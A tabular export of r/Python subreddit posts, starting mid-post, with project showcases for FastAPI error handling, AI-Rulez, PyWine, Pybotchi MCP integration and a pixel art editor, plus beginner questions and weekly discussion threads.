A syntax notation for the empty set has the important benefit of not requiring a name lookup (unlike¬†`set()`).¬†`{/}`¬†will always have a consistent meaning, improving teachability of core concepts to beginners. For example, users must be careful not to use¬†`set`¬†as a local variable name, as doing so prevents constructing new sets. This can be frustrating as beginners may not know how to recover the¬†[`set`](https://docs.python.org/3/library/stdtypes.html#set)¬†type if they have overriden the name. Techniques to do so (e.g.¬†`type({1})`) are not immediately obvious, especially to those learning the language, who may not yet be familiar with the¬†[`type`](https://docs.python.org/3/library/functions.html#type)¬†function.

Finally, this may be helpful for users who do not speak English, as it provides a culture-free notation for a common data structure that is built into the language."
1mntk24,Type hints for variable first mentions - yes/no/sometimes(when?)?,sarnobat,30,17,2025-08-12 00:03:17,https://www.reddit.com/r/Python/comments/1mntk24/type_hints_for_variable_first_mentions/,"I'm new to python from a java background. Python is so easy when you are writing new code or are reading code you wrote in the last hour (e.g. during an interview).

Reading some code I wrote last week in a Colab notebook for a class notebook using some API that I'm learning (e.g. Word2Vec), it's not so easy. I don't know what operations I can perform on this variable I added but didn't name with enough information to trivially determine its type. 

Java is so explicit with type declarations it makes you cry, but I'm seeing the dark side of dynamic typing.

One possible solution is to use type hints anywhere the type info is welcome (subjective I know). But is there any kind of best practice which maybe says that you should not do it to the point it just crowds your code and makes you hate yourself the way Java does?

(EDIT: yes I know modern java has `var` but the reality is it's in very few codebases because of version fatigue. Same reason we don't see much C23 or C++23)"
1mnthov,Tuesday Daily Thread: Advanced questions,AutoModerator,6,2,2025-08-12 00:00:30,https://www.reddit.com/r/Python/comments/1mnthov/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1mnp1st,I built a tool to auto-transcribe and translate China's CCTV News,Acanthisitta-Sea,26,7,2025-08-11 21:00:43,https://www.reddit.com/r/Python/comments/1mnp1st/i_built_a_tool_to_autotranscribe_and_translate/,"**What My Project Does**

I created a Python tool that automatically downloads, transcribes, and translates episodes of CCTV's ""Xinwen Lianbo"" (Êñ∞ÈóªËÅîÊí≠) - China's most-watched daily news program - into English subtitles.

**Target Audience**

Perfect for Chinese language learners who want to practice with real, current news content. The translations are faithful and contextual, making it easier to understand formal/political Chinese vocabulary.

\- Local transcription with Chinese-optimized ASR model (FunASR Paraformer)  
\- OpenRouter API for translation (DeepSeek V3-0324)  
\- All built with modern Python tooling (uv, typer, etc.)  
\- Uses ffmpeg, yt-dlp to generate ready-made ""burned"" video with subtitles and processing.

**Comparison**

There is no project like this on GitHub (yet).

GitHub: [https://github.com/piotrmaciejbednarski/cctv-xinwen-lianbo-en](https://github.com/piotrmaciejbednarski/cctv-xinwen-lianbo-en)"
1mno2u4,Tilf - a Pixel Art Editor written with PySide6,danterolle,21,1,2025-08-11 20:23:38,https://www.reddit.com/r/Python/comments/1mno2u4/tilf_a_pixel_art_editor_written_with_pyside6/,"Hello everyone, lately I‚Äôve been having fun with SDL, and I wanted to try creating a small adventure video game, nothing too complex. However, to call something a proper videogame, you also need a visual component, maybe made up of a few characters and objects interacting with each other, perhaps using Pixel Art, which I personally love.

I searched online, and most of the tools that let you create even a single sprite require an account, ask for an email, are paid, or only work online. There is some open-source software that runs locally, but it can be quite complex to set up, and all I really want are a few simple tools to draw the character/object I have in mind.

Why not create an editor that only does that one thing? From past experience, I‚Äôve loved working with Qt, especially using PySide widgets. So, here it is: I wrote it from scratch using PySide6. No installations, no configurations. You just download it to your computer and start using it right away.

There‚Äôs still a lot that could be improved, but it remains a simple and personal project, nothing demanding. I just hope it might be useful to others. It runs on Windows, MacOS and GNU/Linux.

## What My Project Does

Tilf is a simple cross-platform pixel art editor. It‚Äôs designed for creating sprites, icons, and small 2D assets with essential tools, live preview, undo/redo, and export options.

# Target Audience

Developers, or simply users who are learning some new technology and need a tool that allows them to quickly create sprites/tiles without installations or configurations.

# Comparison

Compared to other platforms, it‚Äôs completely free, works offline, has almost zero dependencies (just PySide6, already included in the executable, so no configuration needed), and can be launched with a single click. No registration or account required.

Link:¬†[https://github.com/danterolle/tilf](https://github.com/danterolle/tilf)
"
1mngei8,I built a tool that uses the 'ast' module to auto-generate interactive flowcharts from any Python.,NewtonGraph,0,40,2025-08-11 15:41:03,https://www.reddit.com/r/Python/comments/1mngei8/i_built_a_tool_that_uses_the_ast_module_to/,"Like many of you, I've often found myself deep in an unfamiliar codebase, trying to trace the logic and get a high-level view of how everything fits together. It can be a real time sink. To solve this, I built a feature into my larger project, Newton, specifically for Python developers.

**What the product does**

Newton is a web app that parses a Python script using the¬†ast¬†module and automatically generates a procedural flowchart from it. It's designed to give you an instant visual understanding of the code's architecture, control flow, and dependencies.

Here it is analyzing a 3,000+ line Python application (app.py):¬†[Gx10jXQW4AAzhH5 (1903√ó997)](https://pbs.twimg.com/media/Gx10jXQW4AAzhH5?format=jpg&name=large)

**Key Features for Developers**

* **Automated Flowcharting:**¬†Just paste your code and it builds the graph, mapping out function definitions, loops, and conditionals.
* **Topic Clustering:**¬†For large scripts, an AI analyzes the graph to find higher-order concepts and emergent properties. In the screenshot, you can see it identifying things like ""Application Initialization"" and ""User Authentication"" automatically. This helps you understand what different parts of the code¬†do¬†conceptually.
* **Interactive Chat:**¬†You can select a node (like a function) or a whole Topic Cluster and ask questions about it. It's like having an agent that has already read and understood your code.

**Target Audience**

I built this for:

* **Developers**¬†who are onboarding to a new, complex project.
* **Students**¬†trying to visualize algorithms and data structures.
* **Code reviewers**¬†who need a quick high-level overview before diving into the details.
* Anyone who prefers thinking visually about code logic.

**Tech Stack**

The application backend is built with¬†**Flask**. The flowchart generation relies heavily on Python's native¬†**ast¬†module**. The frontend is vanilla JS with Vis.js for the graph rendering.

**How to Try It**

You can try it live right now:

1. Go to¬†[**https://www.newtongraph.com**](https://www.google.com/url?sa=E&q=https%3A%2F%2Fwww.newtongraph.com)
2. On the right-hand ""Document"" panel, set the ""Doc Type"" to¬†**Python**.
3. Paste in your script and click the blue ""regenerate"" button.

I'm still actively developing this, and I would be incredibly grateful for your feedback.

Thanks for taking a look!

**Bonus**: Newton is able to accept URL's to various webpages such as YouTube videos and GitHub repos to instantly map their contents. Here is a small GitHub repo with a few sample tools to demonstrate this: [Morrowindchamp/Python-Tools](https://github.com/Morrowindchamp/Python-Tools)

Update: audio and video file transcription have been integrated into Newton! Go to town. Newton can take it. Love you guys. 

NOTE: 1-WEEK PRO TRIAL FOR ALL NEW USERS"
1mnf7ss,APIException (#3 in r/FastAPI pip package flair) ‚Äì Fixes Messy JSON Responses (+0.72 ms),SpecialistCamera5601,11,3,2025-08-11 14:56:07,https://www.reddit.com/r/Python/comments/1mnf7ss/apiexception_3_in_rfastapi_pip_package_flair/,"What My Project Does

If you‚Äôve built anything with FastAPI, you‚Äôve probably seen this mess:

* One endpoint returns 200 with one key structure
* Another throws an error with a completely different format
* Pydantic validation errors use yet another JSON shape
* An unhandled exception drops an HTML error page into your API, and yeah, FastAPI auto-generates Swagger, but it doesn‚Äôt correctly show error cases by default.

The frontend team cries because now they have to handle **five** different response shapes.

**With** [APIException](https://github.com/akutayural/APIException)**:**

* Both success and error responses follow the same ResponseModel schema
* Even unhandled exceptions return the same JSON format
* Swagger docs show **every** possible response (200, 400, 500‚Ä¶) with clear models
* Frontend devs stop asking ‚Äúwhat does this endpoint return?‚Äù ‚Äì it‚Äôs always the same
* All errors are logged by default

**Target Audience**

* FastAPI devs are tired of inconsistent response formats
* Teams that want clean, predictable Swagger docs
* Anyone who wants unhandled exceptions to return nice, readable JSON
* People who like ‚Äúone format, zero surprises‚Äù between backend and frontend

**Comparison**

I benchmarked it against FastAPI‚Äôs built-in HTTPException using Locust with 200 concurrent users for 2 minutes:

|fastapi HTTPException|apiexception APIException|
|:-|:-|
|Avg Latency|2.00ms|2.72ms|
|P95|5ms|6ms|
|P99|9ms|19ms|
|Max Latency|44ms|96ms|
|RPS|609|609|

The difference is acceptable since **APIException** also **logs the exceptions**.

Also, most libraries only standardise errors. This one standardises **everything**.

If you want to stick to the book, *RFC 7807* is supported, too.

[Documentation](https://akutayural.github.io/APIException/) is detailed. I spend lots of time doing that. :D

**Usage**

You can install it as shown below:

    pip install apiexception

After installation, you can copy and paste the below;

    from typing import List
    from fastapi import FastAPI, Path
    from pydantic import BaseModel, Field
    from api_exception import (
        APIException,
        BaseExceptionCode,
        ResponseModel,
        register_exception_handlers,
        APIResponse
    )
    
    app = FastAPI()
    
    # Register exception handlers globally to have the consistent
    # error handling and response structure
    register_exception_handlers(app=app)
    
    # Create the validation model for your response
    class UserResponse(BaseModel):
        id: int = Field(..., example=1, description=""Unique identifier of the user"")
        username: str = Field(..., example=""Micheal Alice"", description=""Username or full name of the user"")
    
    
    # Define your custom exception codes extending BaseExceptionCode
    class CustomExceptionCode(BaseExceptionCode):
        USER_NOT_FOUND = (""USR-404"", ""User not found."", ""The user ID does not exist."")
    
    
    @app.get(""/user/{user_id}"",
        response_model=ResponseModel[UserResponse],
        responses=APIResponse.default()
    )
    async def user(user_id: int = Path()):
        if user_id == 1:
            raise APIException(
                error_code=CustomExceptionCode.USER_NOT_FOUND,
                http_status_code=401,
            )
        data = UserResponse(id=1, username=""John Doe"")
        return ResponseModel[UserResponse](
            data=data,
            description=""User found and returned.""
        )

And then you will have the same structure in your swagger, such as shown in the GIF below.

[Click to see the GIF.](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMGU0ZWF0NXplOGg1NGRldmUzMW4xMjBlajg1MjFxMG9yZmhzMzhycSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/lPPHRLdihcG8J1RtYw/giphy.gif)

Every exception will be logged and will have the same structure. This also applies to success responses. It will be easy for you to catch the errors from the logs since it will always have the 'error\_code' parameter in the response. Your swagger will be super clean, as well.

Would love to hear your feedback.

If you like it, a star on GitHub would be appreciated.

**Links**

Docs: [https://akutayural.github.io/APIException/](https://akutayural.github.io/APIException/)

GitHub: [https://github.com/akutayural/APIException](https://github.com/akutayural/APIException)

PyPI: [https://pypi.org/project/apiexception/](https://pypi.org/project/apiexception/)"
1mnaren,"So, what happened to pypistats?",guyfromwhitechicks,45,11,2025-08-11 11:46:54,https://www.reddit.com/r/Python/comments/1mnaren/so_what_happened_to_pypistats/,"I use this site https://www.pypistats.org/ to gauge the popularity of certain packages, but it has been down for about a month. What gives?"
1mn7b06,AI-Rulez: now also supporting subagents,Goldziher,0,0,2025-08-11 08:18:56,https://www.reddit.com/r/Python/comments/1mn7b06/airulez_now_also_supporting_subagents/,"Hi Peeps,

I'm excited to share AI-Rulez v1.4.0, which has evolved significantly since my initial post here. I've added major features based on community feedback, particularly around team collaboration and agent support. 

You can see [the releases here](https://github.com/Goldziher/ai-rulez/releases) and [the repo here](https://github.com/Goldziher/ai-rulez).

For those unfamiliar - AI-Rulez is a CLI tool that generates configuration files for AI coding assistants (Claude, Cursor, Windsurf, etc.) from a YAML source. It supports defining both rules and agents; nested configuration files; including configuration files from files or urls (e.g. you can share configs via GitHub for example) and also MCP.

## Major Features Since Initial Release:

- **Agent definitions**: Define reusable AI agents with tools and system prompts (v1.3)
- **Remote configuration includes**: Pull rules from GitHub/GitLab URLs with caching (v1.4)
- **MCP server**: Direct integration with Claude Desktop via Model Context Protocol (v1.1)
- **Local overrides**: Team-safe personal customization with `.local.yaml` files (v1.1.3)
- **Rule management CLI**: Add/update/delete rules without editing YAML (v1.2)
- **Directory outputs**: Generate multiple files with patterns like `agents/{name}.md` (v1.3)
- **Performance**: 8x faster with concurrent generation for 10+ files (v1.3)
- **Rich error messages**: Context-aware errors with actionable fix suggestions (v1.2)

## Target Audience

This tool is for Python developers who:
- Use multiple AI coding assistants and want consistent behavior
- Work in teams needing shared coding standards across AI tools
- Build agentic workflows requiring custom agent configurations
- Maintain projects with modern Python tooling (uv, pytest, mypy, ruff)
- Want to future-proof their AI configurations

## Comparison

There are basic alternatives like template-ai and airules, but they're essentially file copiers. AI-Rulez offers:

**Platform-agnostic design**: Works with any AI tool, current or future - just add a new output file.

**Enterprise features**: Remote configuration includes with SSRF protection, team overrides, agent definitions, MCP server integration.

**Performance**: Written in Go for instant startup, concurrent file generation, smart caching.

**Python-first approach**: pip installable, integrates with uv/poetry workflows, Python-specific templates.

## Quick Example

Here's a minimal Python configuration:

```yaml
# ai-rulez.yaml
metadata:
  name: ""Python API Project""

outputs:
  - file: ""CLAUDE.md""
  - file: "".cursorrules""
  - file: "".windsurfrules""

rules:
  - name: ""Python Standards""
    priority: 10
    content: |
      - Python 3.11+ with full type hints
      - Use uv for dependencies, pytest for testing
      - mypy strict mode, ruff for linting
      - Type all functions: def process(data: dict[str, Any]) -> Result:
      - Use | for unions: str | None not Optional[str]

  - name: ""Testing""
    priority: 8
    content: |
      - pytest with async support
      - Factory pattern for test data
      - Real PostgreSQL for integration tests
      - 100% coverage for new code
```

Install and generate:
```bash
pip install ai-rulez
ai-rulez generate  # Creates all configured files
```

## Advanced Features

**Team collaboration with remote configs:**
```yaml
includes:
  - ""https://raw.githubusercontent.com/myorg/standards/main/python-base.yaml""
```

**AI agents for specialized tasks:**
```yaml
agents:
  - name: ""Code Reviewer""
    tools: [""read_file"", ""run_tests""]
    system_prompt: ""Enforce type safety and test coverage""
```

**Personal overrides (ai-rulez.local.yaml):**
```yaml
rules:
  - id: ""testing""  # Override team rule locally
    content: ""Also test with Python 3.13""
```

You can find the codebase on GitHub: https://github.com/Goldziher/ai-rulez. If you find this useful, please star it ‚≠ê - it helps with motivation and visibility.

I've seen teams adopt this for maintaining consistent AI coding standards across large repositories.l, and I personally use it in several large projects. 

Would love to hear about your use cases and any feedback!"
1mn5ukj,SMTP internal server error in fastapi,manizh_hr,0,12,2025-08-11 06:44:10,https://www.reddit.com/r/Python/comments/1mn5ukj/smtp_internal_server_error_in_fastapi/,"I have problem on sending SMTP mail on savella platform using fastapi for mail service I am using aiosmtplib and I try many port numbers like 587,25,2525,465 none is working and return 500 internal server issue when itry on local host it is working properly "
1mn1qsn,I think I messed up badly,rj_SLR,0,22,2025-08-11 02:52:21,https://www.reddit.com/r/Python/comments/1mn1qsn/i_think_i_messed_up_badly/,I downloaded python from python.org on my Mac and I used ChatGPT (ok yea ik now it‚Äôs not a good idea) to code some automations (something like scrapping info from a website). I‚Äôve never coded before btw. After a bunch of hiccups and confusion I decided this is not for me and it‚Äôs just to confusing so I threw everything in the trash. I went into wash folder and deleted everything as it wasn‚Äôt letting me delete it as a whole. I hear online that this is irreversible. What do I do all I have left is the python launcher app in the trash with a couple of files left in the packages. I just bought the Mac so I don‚Äôt mind exchanging it. I also want it to be back to stock I don‚Äôt want any changes 
1mn0ig1,VectorDB - In-memory vector database with swappable indexing,doganarif,15,2,2025-08-11 01:51:51,https://www.reddit.com/r/Python/comments/1mn0ig1/vectordb_inmemory_vector_database_with_swappable/,"# What My Project Does

It's a lightweight vector database that runs entirely in-memory. You can store embeddings, search for similar vectors, and switch between different indexing algorithms (Linear, KD-Tree, LSH) without rebuilding your data.

# Target Audience

This is for developers who need vector search in prototypes or small projects. Not meant for production with millions of vectors - use Pinecone or Weaviate for that.

# Comparison

Unlike Chroma/Weaviate, this doesn't require Docker or external services. Unlike FAISS, you can swap index types on the fly. Unlike Pinecone, it's free and runs locally. The tradeoff: it's in-memory only (with JSON snapshots) and caps out around 100-500k vectors.

GitHub: https://github.com/doganarif/vectordb"
1mmy5dl,Monday Daily Thread: Project ideas!,AutoModerator,5,0,2025-08-11 00:00:31,https://www.reddit.com/r/Python/comments/1mmy5dl/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1mmwps0,Made a Python technical Document for my FreeCodeCamp html/css task,BigLeeWaite,0,3,2025-08-10 22:54:52,https://www.reddit.com/r/Python/comments/1mmwps0/made_a_python_technical_document_for_my/,"Committed and pushed to github then put online via github pages. Will refer to it myself when learning.
https://liam-waite.github.io/FreeCodeCamp-Doc-Task-Python-Documentation/"
1mmsti1,For anyone curious about the Positron IDE: I found a neat guide on using it with Dev Containers,FriendlyAd5913,2,0,2025-08-10 20:13:49,https://www.reddit.com/r/Python/comments/1mmsti1/for_anyone_curious_about_the_positron_ide_i_found/,"I‚Äôve been exploring¬†**Positron IDE**¬†lately and stumbled across a nice little guide that shows how to combine it with:

* **Dev Containers**¬†for reproducible setups
* **DevPod**¬†to run them anywhere
* **Docker**¬†for local or remote execution

**What My Project Does**  
This is a step-by-step guide + sample repo that shows how to run the¬†**Positron IDE**¬†inside a portable development environment.  
It uses:

* **Dev Containers**¬†for reproducible setup
* **DevPod**¬†to run the containers anywhere (local, cloud, remote server)
* **Docker**¬†as the runtime The result is an easy way to spin up Positron without having to manually install all the dependencies locally.

**Target Audience**  
Developers who:

* Want to try¬†**Positron IDE**¬†in a containerized setup
* Are exploring remote or cloud-based development
* Need reproducible dev environments for Python or other projects The guide is beginner-friendly but also useful for more experienced devs who want to test Positron quickly.

**Comparison**  
Compared to other ‚Äúremote dev‚Äù setups:

* This stack is self-hosted, so no vendor lock-in

Repo & guide here:  
üëâ¬†[https://github.com/davidrsch/devcontainer\_devpod\_positron](https://github.com/davidrsch/devcontainer_devpod_positron)"
1mmow8a,PyWine - Containerized Wine with Python to test project under Windows environment,tymonx,26,9,2025-08-10 17:43:12,https://www.reddit.com/r/Python/comments/1mmow8a/pywine_containerized_wine_with_python_to_test/,"- **What My Project Does** - [PyWine](https://gitlab.com/tymonx/pywine) allows to test Python code under Windows environment using containerized [Wine](https://www.winehq.org/). Useful during local development when you natively use Linux or macOS without need of using heavy Virtual Machine. Also it can be used in CI without need of using Windows CI runners. It unifies local development with CI.
- **Target Audience** - Linux/macOS Python developers that want to test their Python code under Windows environment. For example to test native Windows named pipes when using Python built-in [multiprocessing.connection](https://docs.python.org/3/library/multiprocessing.html#module-multiprocessing.connection) module.
- **Comparison** - https://github.com/webcomics/pywine, project with the same name but it doesn't provide the same seamless experience. Like running it out-of-box with the same defined CI job for `pytest` or locally without need of executing some magic script like `/opt/mkuserwineprefix`
- Check the GitLab project for usage: https://gitlab.com/tymonx/pywine
- Check the real usage example from [gitlab.com/tymonx/pytcl/.gitlab-ci.yml](https://gitlab.com/tymonx/pytcl/-/blob/bb67423fd849cd82b87ba85f1710cc392150c069/.gitlab-ci.yml#L55) with GitLab CI job [pytest-windows](https://gitlab.com/tymonx/pytcl/-/jobs/10972220370)"
1mmo3gx,Pybotchi 101: Simple MCP Integration,madolid511,1,0,2025-08-10 17:12:08,https://www.reddit.com/r/Python/comments/1mmo3gx/pybotchi_101_simple_mcp_integration/,"https://github.com/amadolid/pybotchi
- What My Project Does
  - Nested Intent-Based Supervisor Agent Builder
- Target Audience
  - for production
- Comparison
  - lightweight, framework agnostic and simpler way of declaring graph.

# Topic: MCP Integration

# As Client

### Prerequisite

- LLM Declaration

```python
from pybotchi import LLM
from langchain_openai import ChatOpenAI

LLM.add(
    base = ChatOpenAI(.....)
)
```

- MCP Server (`MCP-Atlassian`)
  > docker run --rm -p 9000:9000 -i --env-file your-env.env ghcr.io/sooperset/mcp-atlassian:latest --transport streamable-http --port 9000 -vv

### Simple Pybotchi Action

```python
from pybotchi import ActionReturn, MCPAction, MCPConnection

class AtlassianAgent(MCPAction):
    """"""Atlassian query.""""""

    __mcp_connections__ = [
        MCPConnection(""jira"", ""http://0.0.0.0:9000/mcp"", require_integration=False)
    ]

    async def post(self, context):
        readable_response = await context.llm.ainvoke(context.prompts)
        await context.add_response(self, readable_response.content)
        return ActionReturn.END
```

- `post` is only recommended if mcp tools responses is not in natural language yet.
- You can leverage `post` or `commit_context` for final response generation

### View Graph

```python
from asyncio import run
from pybotchi import graph

print(run(graph(AtlassianAgent)))
```

#### **Result**

```
flowchart TD
mcp.jira.JiraCreateIssueLink[mcp.jira.JiraCreateIssueLink]
mcp.jira.JiraUpdateSprint[mcp.jira.JiraUpdateSprint]
mcp.jira.JiraDownloadAttachments[mcp.jira.JiraDownloadAttachments]
mcp.jira.JiraDeleteIssue[mcp.jira.JiraDeleteIssue]
mcp.jira.JiraGetTransitions[mcp.jira.JiraGetTransitions]
mcp.jira.JiraUpdateIssue[mcp.jira.JiraUpdateIssue]
mcp.jira.JiraSearch[mcp.jira.JiraSearch]
mcp.jira.JiraGetAgileBoards[mcp.jira.JiraGetAgileBoards]
mcp.jira.JiraAddComment[mcp.jira.JiraAddComment]
mcp.jira.JiraGetSprintsFromBoard[mcp.jira.JiraGetSprintsFromBoard]
mcp.jira.JiraGetSprintIssues[mcp.jira.JiraGetSprintIssues]
__main__.AtlassianAgent[__main__.AtlassianAgent]
mcp.jira.JiraLinkToEpic[mcp.jira.JiraLinkToEpic]
mcp.jira.JiraCreateIssue[mcp.jira.JiraCreateIssue]
mcp.jira.JiraBatchCreateIssues[mcp.jira.JiraBatchCreateIssues]
mcp.jira.JiraSearchFields[mcp.jira.JiraSearchFields]
mcp.jira.JiraGetWorklog[mcp.jira.JiraGetWorklog]
mcp.jira.JiraTransitionIssue[mcp.jira.JiraTransitionIssue]
mcp.jira.JiraGetProjectVersions[mcp.jira.JiraGetProjectVersions]
mcp.jira.JiraGetUserProfile[mcp.jira.JiraGetUserProfile]
mcp.jira.JiraGetBoardIssues[mcp.jira.JiraGetBoardIssues]
mcp.jira.JiraGetProjectIssues[mcp.jira.JiraGetProjectIssues]
mcp.jira.JiraAddWorklog[mcp.jira.JiraAddWorklog]
mcp.jira.JiraCreateSprint[mcp.jira.JiraCreateSprint]
mcp.jira.JiraGetLinkTypes[mcp.jira.JiraGetLinkTypes]
mcp.jira.JiraRemoveIssueLink[mcp.jira.JiraRemoveIssueLink]
mcp.jira.JiraGetIssue[mcp.jira.JiraGetIssue]
mcp.jira.JiraBatchGetChangelogs[mcp.jira.JiraBatchGetChangelogs]
__main__.AtlassianAgent --> mcp.jira.JiraCreateIssueLink
__main__.AtlassianAgent --> mcp.jira.JiraGetLinkTypes
__main__.AtlassianAgent --> mcp.jira.JiraDownloadAttachments
__main__.AtlassianAgent --> mcp.jira.JiraAddWorklog
__main__.AtlassianAgent --> mcp.jira.JiraRemoveIssueLink
__main__.AtlassianAgent --> mcp.jira.JiraCreateIssue
__main__.AtlassianAgent --> mcp.jira.JiraLinkToEpic
__main__.AtlassianAgent --> mcp.jira.JiraGetSprintsFromBoard
__main__.AtlassianAgent --> mcp.jira.JiraGetAgileBoards
__main__.AtlassianAgent --> mcp.jira.JiraBatchCreateIssues
__main__.AtlassianAgent --> mcp.jira.JiraSearchFields
__main__.AtlassianAgent --> mcp.jira.JiraGetSprintIssues
__main__.AtlassianAgent --> mcp.jira.JiraSearch
__main__.AtlassianAgent --> mcp.jira.JiraAddComment
__main__.AtlassianAgent --> mcp.jira.JiraDeleteIssue
__main__.AtlassianAgent --> mcp.jira.JiraUpdateIssue
__main__.AtlassianAgent --> mcp.jira.JiraGetProjectVersions
__main__.AtlassianAgent --> mcp.jira.JiraGetBoardIssues
__main__.AtlassianAgent --> mcp.jira.JiraUpdateSprint
__main__.AtlassianAgent --> mcp.jira.JiraBatchGetChangelogs
__main__.AtlassianAgent --> mcp.jira.JiraGetUserProfile
__main__.AtlassianAgent --> mcp.jira.JiraGetWorklog
__main__.AtlassianAgent --> mcp.jira.JiraGetIssue
__main__.AtlassianAgent --> mcp.jira.JiraGetTransitions
__main__.AtlassianAgent --> mcp.jira.JiraTransitionIssue
__main__.AtlassianAgent --> mcp.jira.JiraCreateSprint
__main__.AtlassianAgent --> mcp.jira.JiraGetProjectIssues
```

### Execute

```python
from asyncio import run
from pybotchi import Context

async def test() -> None:
    """"""Chat.""""""
    context = Context(
        prompts=[
            {
                ""role"": ""system"",
                ""content"": ""Use Jira Tool/s until user's request is addressed"",
            },
            {
                ""role"": ""user"",
                ""content"": ""give me one inprogress ticket currently assigned to me?"",
            },
        ]
    )
    await context.start(AtlassianAgent)
    print(context.prompts[-1][""content""])


run(test())
```

#### **Result**

```
Here is one ""In Progress"" ticket currently assigned to you:

- Ticket Key: BAAI-244
- Summary: [FOR TESTING ONLY]: Title 1
- Description: Description 1
- Issue Type: Task
- Status: In Progress
- Priority: Medium
- Created: 2025-08-11
- Updated: 2025-08-11
```

## Override Tools (JiraSearch)

```
from pybotchi import ActionReturn, MCPAction, MCPConnection, MCPToolAction

class AtlassianAgent(MCPAction):
    """"""Atlassian query.""""""

    __mcp_connections__ = [
        MCPConnection(""jira"", ""http://0.0.0.0:9000/mcp"", require_integration=False)
    ]

    async def post(self, context):
        readable_response = await context.llm.ainvoke(context.prompts)
        await context.add_response(self, readable_response.content)
        return ActionReturn.END

    class JiraSearch(MCPToolAction):
        async def pre(self, context):
            print(""You can do anything here or even call `super().pre`"")
            return await super().pre(context)
```

### View Overridden Graph

```
flowchart TD
... same list ...
mcp.jira.patched.JiraGetIssue[mcp.jira.patched.JiraGetIssue]
... same list ...
__main__.AtlassianAgent --> mcp.jira.patched.JiraGetIssue
... same list ...
```

#### **Updated Result**

```
You can do anything here or even call `super().pre`
Here is one ""In Progress"" ticket currently assigned to you:

- Ticket Key: BAAI-244
- Summary: [FOR TESTING ONLY]: Title 1
- Description: Description 1
- Issue Type: Task
- Status: In Progress
- Priority: Medium
- Created: 2025-08-11
- Last Updated: 2025-08-11
- Reporter: Alexie Madolid

If you need details from another ticket or more information, let me know!
```

# As Server

#### **server.py**

```python
from contextlib import AsyncExitStack, asynccontextmanager
from fastapi import FastAPI
from pybotchi import Action, ActionReturn, start_mcp_servers

class TranslateToEnglish(Action):
    """"""Translate sentence to english.""""""

    __mcp_groups__ = [""your_endpoint1"", ""your_endpoint2""]

    sentence: str

    async def pre(self, context):
        message = await context.llm.ainvoke(
            f""Translate this to english: {self.sentence}""
        )
        await context.add_response(self, message.content)
        return ActionReturn.GO

class TranslateToFilipino(Action):
    """"""Translate sentence to filipino.""""""

    __mcp_groups__ = [""your_endpoint2""]

    sentence: str

    async def pre(self, context):
        message = await context.llm.ainvoke(
            f""Translate this to Filipino: {self.sentence}""
        )
        await context.add_response(self, message.content)
        return ActionReturn.GO

@asynccontextmanager
async def lifespan(app):
    """"""Override life cycle.""""""
    async with AsyncExitStack() as stack:
        await start_mcp_servers(app, stack)
        yield


app = FastAPI(lifespan=lifespan)
```

#### **client.py**

```bash
from asyncio import run

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client


async def main(endpoint: int):
    async with streamablehttp_client(
        f""http://localhost:8000/your_endpoint{endpoint}/mcp"",
    ) as (
        read_stream,
        write_stream,
        _,
    ):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            tools = await session.list_tools()
            response = await session.call_tool(
                ""TranslateToEnglish"",
                arguments={
                    ""sentence"": ""Kamusta?"",
                },
            )
            print(f""Available tools: {[tool.name for tool in tools.tools]}"")
            print(response.content[0].text)


run(main(1))
run(main(2))
```

#### **Result**

```
Available tools: ['TranslateToEnglish']
""Kamusta?"" in English is ""How are you?""
Available tools: ['TranslateToFilipino', 'TranslateToEnglish']
""Kamusta?"" translates to ""How are you?"" in English.
```
"
